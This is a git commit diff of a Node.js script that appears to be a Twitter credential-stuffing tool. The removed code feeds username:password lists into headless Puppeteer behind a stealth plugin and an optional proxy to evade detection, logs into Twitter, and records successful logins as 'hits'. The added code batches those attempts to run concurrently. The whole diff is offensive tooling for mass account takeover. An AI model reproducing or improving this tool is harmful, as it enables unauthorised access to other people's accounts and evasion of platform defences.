23c34293f413a09508d3243be5f050fb6ceaa5df
Alex Casadevall <lexcasa@MacBook-Air-de-Alex.local>
2022-12-27 13:26:53 -0300

    feat: add helpers and order the mess

--- app.js
+++ app.js
@@ -1,29 +1,15 @@
 // super fast browser - like it :)
 require('dotenv').config()
-const puppeteer = require('puppeteer-extra')
-const {executablePath} = require('puppeteer')
 const fs        = require('fs')
 const readline  = require('readline');
 
-// add stealth plugin and use defaults (all evasion techniques)
-const StealthPlugin = require('puppeteer-extra-plugin-stealth')
-puppeteer.use(StealthPlugin());
-
-const {delay}        = require('./services/helpers')
-const USE_PROXY      = process.env.USE_PROXY
-const TWT_LOGIN      = process.env.TWT_LOGIN
-const TWT_HOME       = process.env.TWT_HOME
-const TWT_CHALLENGE  = process.env.TWT_CHALLENGE
-const USR_TAG        = process.env.USR_TAG
-const NEXT_TAG       = process.env.NEXT_TAG
-const PSW_TAG        = process.env.PSW_TAG
-const LGN_TAG        = process.env.LGN_TAG
-const IN_FILE        = process.env.IN_FILE
-const OUT_FILE       = process.env.OUT_FILE
-const FAIL_FILE      = process.env.FAIL_FILE;
+const Helper = require('./services/helpers')
+const IN_FILE           = process.env.IN_FILE
+const BATCH_SIZE        = process.env.BATCH_SIZE;
 
 // Run async process
-(async () => {
+async function main () {
+    console.time('main')
     // Process lines
     const fileStream = fs.createReadStream(IN_FILE);
 
@@ -33,60 +19,26 @@ const FAIL_FILE      = process.env.FAIL_FILE;
     });
 
     let lap = 0
+    let recordsCounter = 0
+    let resolver = []
     for await (const line of rl) {
-        const start = new Date();
+        recordsCounter += 1
+        // Array of promisses
+        resolver.push(Helper.processLine(line, lap))
+        console.log("resolver :: ", resolver)
 
-        let usr = {
-            userName: '',
-            password: ''
+        if (recordsCounter >= BATCH_SIZE) {
+            fileStream.pause();
+            // Run resolver
+            const resolveAll = await Promise.all(resolver)
+            console.log("resolveAll: ", resolveAll)
+
+            recordsCounter = 0;
+            resolver = [];
+            fileStream.resume();
         }
-        let spl = line.split(':')
-
-        usr.userName = spl[0]
-        usr.password = spl[1]
-
-        // open our lovely browser
-        const browser = await puppeteer.launch({
-            headless: true,
-            slowMo: 250,
-            args: [USE_PROXY ? `--proxy-server=${USE_PROXY}` : ''],
-            executablePath: executablePath()
-        });
-        
-        const page = await browser.newPage();
-        // open twitter
-        await page.goto(TWT_LOGIN, {waitUntil: 'networkidle2'})
-        await delay(500)
-        // Focus and fast send characters - username
-        await page.focus(USR_TAG)
-        await page.keyboard.sendCharacter(usr.userName)
-        // Next step of flow
-        await page.click(NEXT_TAG)
-        // Focus and fast send characters - password
-        await page.focus(PSW_TAG)
-        await page.keyboard.sendCharacter(usr.password)
-        await delay(500)
-        // Login action
-        await page.click(LGN_TAG)
-        await delay(5000)
-        // Check url if it's OK or not
-        const url = await page.evaluate(() => document.location.href);
-        // Success
-        if(url == TWT_HOME || url == TWT_CHALLENGE){
-            // Save hit
-            fs.appendFileSync(OUT_FILE, `${line}\n`);
-        } else if (url == TWT_LOGIN){
-            // Fail accounts
-            fs.appendFileSync(FAIL_FILE, `${line}\n`);
-        }
-        // To-Do add verified accounts check
-        console.log("url type :: ", url)
-        // Close browser - we do not waste our ram
-        await browser.close();
-        // Each line in input.txt will be successively available here as `line`.
-
-        const end = new Date()
-        lap++
-        console.log(`Lap ${lap} :: time estimated finish ${end - start} ms`)
     }
-})();
+    console.log("Resolve all promisses ::: ")
+    console.timeEnd('main')
+}
+main()
